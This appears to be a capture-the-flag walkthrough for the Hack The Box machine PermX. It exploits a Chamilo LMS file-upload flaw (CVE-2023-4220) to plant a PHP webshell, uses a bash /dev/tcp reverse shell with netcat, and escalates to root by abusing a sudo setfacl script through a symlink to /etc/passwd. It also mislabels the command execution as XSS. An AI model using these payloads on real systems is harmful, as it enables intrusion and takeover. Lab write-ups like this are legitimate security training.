# Beginners Guide To PermX

URL: https://app.hackthebox.com/machines/PermX

## Tools

- nmap
- gobuster
- BurpSuite (Decoder Tab)
- nc (netcat)

## Reconnaissance

### Scanning for open ports and services

- The first step in attempting to pwn any machine is to check for any open ports on that victim machine. A cli tool commonly used for this step is NMAP.

    - For more info on NMAP, checkout out: https://nmap.org/book/man.html

- With enough probing, you may discover the OS and a few interesting ports.

    - If you are unfamiliar with the ports discovered, checkout the following resource for identifying common ports and services: https://www.speedguide.net/ports.php?

    - Another resource to use when gathering intelligence, is to check CVE lists for ports and services identified on your victim machine, to learn about any documented volnurabilities: https://cve.mitre.org/cve/search_cve_list.html

#### NMAP Result

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 10:31 MDT
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.063s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
```

### Scanning subdomains

- From the nmap results, you should have identified a web page being hosted on the victim machine. Using a web browswer, navigate to the victim IP address on port 80 and you should see that it tries to resolve to permx.htb but it may not load correctly. Let's add this IP and domain to the host file on our attack machine.

#### /etc/hosts file

```
10.10.11.23 permx.htb
```

- For the next phase of reconnaissance, we should try scanning for subdomains. The tool I use for this is Gobuster, which has the following syntax:

    ```
    gobuster vhost -w /path/to/wordlist.txt -u http://victim_url.fun --append-domain
    ```

    - If you don't know where to get a wordlist for gobuster, checkout SecLists: https://github.com/danielmiessler/SecLists

- After letting gobuster scan for subdomains, you may find a new URL: http://lms.permx.htb. A login page for Chamilo.

## Establishing a foothold

### XSS

Next, we should search the internet for known chamilo lms exploits. I found the following advisory (CVE-2023-4220): https://starlabs.sg/advisories/23/23-4220/

The bulletin states that Chamilo is PHP based, and confirms a vulnerability that allows an unauthenticated user to upload files to '/main/inc/lib/javascript/bigupload/files'. The bulletin also provides a blueprint for our attack in their proof of concept:

- We start by creating a simple PHP script on our attack machine that uses the system() function to execute commands passed to the 'cmd' parameter through the HTTP GET method. I'll name mine webshell.php

    #### webshell.php

    ```PHP
    <?php echo system($_GET["cmd"])?>
    ```

- Next, from our attack machine, we'll use curl to upload webshell.php.

    #### Terminal

    ```bash
    curl -F 'bigUploadFile=@webshell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
    ```

    - You should receive the following output: The file has successfully been uploaded.

- Let's test our webshell by passing the 'cmd' parameter a basic command like 'ls' to list the current directory.

    #### Terminal

    ```bash
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=ls'
    ```

    #### Output

    ```
    webshell.php
    ```


- We have confirmed that our webshell works. However, what happens if we want to use a command with spaces and hyphens, like 'ls -la'. URLs (and some Security Controls) don't allow for spaces and certain special characters. Our next option is to try encoding our 'ls -la' command into our URL (I use BurpSuite's Decoder tab to help me):

    #### Terminal

    ```bash
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=%6c%73%20%2d%6c%61
    ```

    #### Output

    ```
    total 12
    drwxr-xr-x 2 www-data www-data 4096 Oct 25 00:20 .
    drwxr-xr-x 6 www-data www-data 4096 Jan 20  2024 ..
    -rw-r--r-- 1 www-data www-data   33 Oct 25 00:20 webshell.php
    ```

- Now that we can comfortably craft some XSS attacks, it's time to establish a reverse shell. Reverse shells trick the victim machine into establishing a limited shell session with your attack machine. Let's write our bash script, I'll name mine rev_shell.sh

    #### rev_shell.sh

    ```bash
    #! /bin/bash

    # The attack machine ip
    attack_ip=''

    # The arbritrary port to listen on from attack machine
    attack_port=''

    /bin/bash -i >& /dev/tcp/$attack_ip/$attack_port 0>&1
    ```

- Let's upload rev_shell.sh

    #### Terminal

    ```bash
    curl -F 'bigUploadFile=@rev_shell.sh' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
    ```

- List the long format of all entries in the directory once more to confirm the upload.

    #### Terminal

    ```bash
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=%6c%73%20%2d%6c%61
    ```

    #### Output

    ```
    total 16
    drwxr-xr-x 2 www-data www-data 4096 Oct 25 01:24 .
    drwxr-xr-x 6 www-data www-data 4096 Jan 20  2024 ..
    -rw-r--r-- 1 www-data www-data   67 Oct 25 01:24 rev_shell.sh
    -rw-r--r-- 1 www-data www-data   33 Oct 25 00:20 webshell.php
    ```

- The next step to executing a reverse shell is to give the file execute permissions. The command is 'chmod +x rev_shell.sh', however, we'll need to encode this to get past the white spaces and special characters.

    #### Terminal

    ```bash
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=%63%68%6d%6f%64%20%2b%78%20%72%65%76%5f%73%68%65%6c%6c%2e%73%68'
    ```

- Once more we list the directory contents to confirm that we added execute permissions to our rev_shell.sh file.

    #### Terminal

    ```bash
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=%6c%73%20%2d%6c%61
    ```

    #### Output

    ```
    total 16
    drwxr-xr-x 2 www-data www-data 4096 Oct 25 01:24 .
    drwxr-xr-x 6 www-data www-data 4096 Jan 20  2024 ..
    -rwxr-xr-x 1 www-data www-data   67 Oct 25 01:24 rev_shell.sh
    -rw-r--r-- 1 www-data www-data   33 Oct 25 00:20 webshell.php
    ```

- To complete the reverse shell, we'll need to set up a port to listen on our attack machine using the netcat cli tool, and we'll need to execute rev_shell.sh on the victim machine.

    #### Netcat listening port

    ```bash
    nc -lvnp $attack_port
    ```

    - Note: The curl command below has the encoded version of the command: bash rev_shell.sh

    #### Executing rev_shell.sh

    ```bash
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=%62%61%73%68%20%72%65%76%5f%73%68%65%6c%6c%2e%73%68'
    ```

We're in! The terminal window running netcat should now have a shell session with the victim machine

## Privilege escalation

It's time to escalate our privilege:

- We begin by navigating to the following file: '/var/www/chamilo/app/config/configuration.php'

    - I grepped for 'db_' and found the following: 

    #### Configuration.php

    ```php
    $_configuration['db_host'] = 'localhost';
    $_configuration['db_port'] = '3306';
    $_configuration['db_user'] = 'chamilo';
    $_configuration['db_password'] = '0*********8';
    $_configuration['db_manager_enabled'] = false;
    //$_configuration['session_stored_in_db_as_backup'] = true;
    //$_configuration['sync_db_with_schema'] = false;
    ```

- The next logical step was to try these credentials in the login page and ssh to the victim machine. Both of these options failed.

- Next, back in my reverse shell session, I decided to grep the '/etc/passwd' file for the term '/bash':

    #### Terminal

    ```bash
    cat /etc/passwd | grep /bash
    ```

    #### Output

    ```
    root:x:0:0:root:/root:/bin/bash
    m**:x:1000:1000:mtz:/home/mtz:/bin/bash
    ```

    - Let's try to SSH as the non-root user we found... Success!

## Capturing the user flag

- The user flag can be found right on the home directory of the user's credentials we just obtained.

## Capturing the root flag

- For the root flag, we first need to find what sudo permissions our current user has:

    #### Terminal

    ```bash
    sudo -l
    ```

    #### Output

    ```bash
    Matching Defaults entries for m** on permx:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty

    User m** may run the following commands on permx:
        (ALL : ALL) NOPASSWD: /opt/acl.sh
    ```

- Let's open up '/opt/acl.sh; and investigate that further.

    #### acl.sh

    ```bash
    #!/bin/bash

    if [ "$#" -ne 3 ]; then
        /usr/bin/echo "Usage: $0 user perm file"
        exit 1
    fi
    ```

    -   This section of the script tells us that it takes 3 arguements.

    #### acl.sh (continued)

    ```bash
    user="$1"
    perm="$2"
    target="$3"
    ```

    - This section tells us the order of the syntax: acl.sh [user] [perm] [file]

    #### acl.sh (continued)

    ```bash
    if [[ "$target" != /home/m**/* || "$target" == *..* ]]; then
        /usr/bin/echo "Access denied."
        exit 1
    fi
    ```

    - This section tells us that the file argument named $target needs to be '/home/m**/*' and does not allow directory traversal '..'.

    #### acl.sh (continued)

    ```bash
    # Check if the path is a file
    if [ ! -f "$target" ]; then
        /usr/bin/echo "Target must be a file."
        exit 1
    fi
    ```

    - This section tells us that $target must be a file.

    #### acl.sh (continued)

    ```bash
    /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
    ```

    - This last section tells us it will run '/usr/bin/setfacl'

- Now that we have a better understanding of the acl.sh script, we can begin crafting our next attack.

    - We will make a symlink of the '/etc/passwd' file, from within m**'s home directory, I named my symlink axolotl.

    #### Terminal

    ```bash
    ln -s /etc/passwd /home/m**/axolotl
    ```

    - Next, we will use the acl.sh script to give our symlink file write permissions.

    #### Terminal

    ```bash
    sudo /opt/acl.sh m** rw /home/mtz/axolotl
    ```

    - Now, we will add an entry to file.

    #### Terminal

    ```bash
    nano axolotl
    ```

    - Add the m** user as a root user by using the following syntax: user::0:0:/root:/bin/bash

    - Escalate privilege by using: su m**
    
    - Check that you have root permissions: id

        #### id output

        ```bash
        uid=0(m**) gid=0(root) groups=0(root),1000(m**)
        ```

    - Finally, the root flag can be found at: /root/root.txt

# Additional resources

- SecLists: https://github.com/danielmiessler/SecLists

- Revshells: https://www.revshells.com/
